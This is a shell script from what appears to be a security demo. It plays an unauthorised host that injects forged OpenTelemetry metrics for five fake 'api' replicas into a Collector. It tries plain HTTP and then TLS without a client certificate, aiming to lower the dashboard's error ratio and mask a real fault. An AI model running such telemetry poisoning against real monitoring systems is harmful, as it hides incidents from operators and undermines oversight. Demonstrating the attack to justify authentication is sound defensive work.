#!/bin/sh
# The ATTACKER: an unauthorised host on the network that injects FORGED telemetry into the Collector.
# Every cycle it claims that 5 extra replicas of api (api-agent-2 .. api-agent-6, which do not exist)
# report 0 % errors, so the average error ratio on the dashboard drops and the real problem disappears.
# It has no certificate, so it tries what an attacker would: plain HTTP first, then TLS without a
# client certificate (-k = "do not verify the server").
#   attack.sh        -> loop every 2 s (started and stopped by scripts/act3.sh poison on|off)
#   attack.sh once   -> one attempt, print the result, exit 0 if accepted and 1 if rejected
set -eu
. /usr/local/bin/otlp.sh

# Build the forged payload: several fake replicas in one request.
forged_payload() {
  resources=""
  for replica in 2 3 4 5 6; do
    block="$(resource_block "api-agent-$replica" "0.0" "$((8 + $(rand 5)))")"
    resources="${resources:+$resources,}$block"
  done
  printf '{"resourceMetrics":[%s]}' "$resources"
}

# One attempt. Returns 0 if the Collector accepted the forged data.
attempt() {
  PAYLOAD="$(forged_payload)"
  plain="$(post "http://$COLLECTOR:4318$ENDPOINT_PATH")"
  if [ "${plain%%|*}" = "200" ]; then
    echo "[$(date +%H:%M:%S)] atacante: ACEPTADO por el Collector (HTTP 200, texto plano): 5 réplicas falsas inyectadas"
    return 0
  fi
  tls="$(post "https://$COLLECTOR:4318$ENDPOINT_PATH" -k)"
  if [ "${tls%%|*}" = "200" ]; then
    echo "[$(date +%H:%M:%S)] atacante: ACEPTADO por el Collector (HTTP 200, TLS sin certificado de cliente)"
    return 0
  fi
  echo "[$(date +%H:%M:%S)] atacante: RECHAZADO"
  echo "    http plano    -> HTTP ${plain%%|*} ${plain#*|}"
  echo "    https sin cert -> HTTP ${tls%%|*} ${tls#*|}"
  return 1
}

if [ "${1:-}" = "once" ]; then
  attempt && exit 0 || exit 1
fi

while true; do
  attempt || true
  sleep 2
done
